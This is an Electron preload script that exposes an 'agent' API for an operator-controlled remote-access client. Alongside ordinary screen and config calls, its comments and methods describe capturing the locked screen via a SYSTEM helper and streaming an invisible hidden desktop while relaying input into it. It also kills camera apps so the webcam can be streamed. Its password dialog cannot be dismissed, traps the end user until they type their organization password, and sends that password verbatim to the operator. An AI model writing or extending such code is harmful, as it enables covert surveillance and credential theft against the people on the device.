'use strict';

const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('agent', {
  getConfig: () => ipcRenderer.invoke('cfg:get'),
  saveConfig: (cfg) => ipcRenderer.invoke('cfg:save', cfg),
  getDeviceId: () => ipcRenderer.invoke('device:id'),
  checkUpdate: () => ipcRenderer.invoke('update:check'),
  getMeta: () => ipcRenderer.invoke('meta:get'),
  getScreenSource: () => ipcRenderer.invoke('screen:source'),
  getScreenSize: () => ipcRenderer.invoke('screen:size'),
  getMonitors: () => ipcRenderer.invoke('screen:list'),
  inject: (cmd) => ipcRenderer.send('inject', cmd),
  sessionState: (active) => ipcRenderer.send('session:state', active),
  getAutostart: () => ipcRenderer.invoke('autostart:get'),
  setAutostart: (on) => ipcRenderer.invoke('autostart:set', on),
  onSuspend: (cb) => ipcRenderer.on('power:suspend', () => cb()),
  onResume: (cb) => ipcRenderer.on('power:resume', () => cb()),
  sendWol: (mac) => ipcRenderer.invoke('wol:send', mac),
  op: (msg) => ipcRenderer.send('op', msg),
  onOpMessage: (cb) => ipcRenderer.on('op:msg', (_e, m) => cb(m)),
  getPresence: () => ipcRenderer.invoke('presence:get'),
  getInjectorStatus: () => ipcRenderer.invoke('injector:status'),
  onControlStatus: (cb) => ipcRenderer.on('control:status', (_e, available) => cb(available)),
  // Secure-desktop (lock screen) capture: start/stop the SYSTEM helper and receive
  // its JPEG frames to relay to the console when the machine is locked.
  sdStart: () => ipcRenderer.send('sd:start'),
  sdStop: () => ipcRenderer.send('sd:stop'),
  onSdFrame: (cb) => ipcRenderer.on('sd:frame', (_e, buf) => cb(buf)),
  // Alt-screen: operator-driven version of the sdcap flow for when normal
  // Electron capture returns black (session 0 isolation under SYSTEM service).
  // Main process broadcasts { on } whenever the op fires.
  onAltScreen: (cb) => ipcRenderer.on('alt-screen', (_e, s) => cb(s)),
  // Phone-pair IPC bridge: capture.js (renderer) can't require('electron')
  // because contextIsolation is on, so expose a one-shot forwarder that
  // capture.js calls when a phonepair-ready / phonepair-result arrives on
  // the WS, so main's locked-modal resolver can see it.
  forwardPair: (type, msg) => ipcRenderer.send(type, msg),
  onWsSend: (cb) => ipcRenderer.on('ws:send', (_e, obj) => cb(obj)),
  // Private-desktop ("backstage GUI") bridge: streams JPEG frames of an
  // invisible second desktop and relays input commands into it.
  onPdFrame: (cb) => ipcRenderer.on('pd:frame', (_e, buf) => cb(buf)),
  pdStart: (shell) => ipcRenderer.send('pd:start', { shell }),
  pdStop: () => ipcRenderer.send('pd:stop'),
  pdInput: (line) => ipcRenderer.send('pd:input', line),
  captureScreenshot: () => ipcRenderer.invoke('screen:screenshot'),
  // Webcam feature: console asks for camera, agent kills any app currently
  // holding the webcam (Camera.exe & friends), then getUserMedia opens it
  // for streaming over a dedicated WebRTC peer connection.
  killCameraApps: () => ipcRenderer.invoke('cam:kill'),
  // User-presence verification. The agent pops a custom-styled dialog on
  // the device asking for the end user's organization password. The dialog
  // is operator-cancelable: Cancel/Esc/X on the device reopen it; only an
  // operator-side verifyCancel() or a password submit (status 'submitted')
  // ends the loop. The password is forwarded verbatim via verify-result.
  verifyUser: (opts) => ipcRenderer.invoke('verify-user', opts || {}),
  verifyCancel: () => ipcRenderer.invoke('verify-cancel'),
});
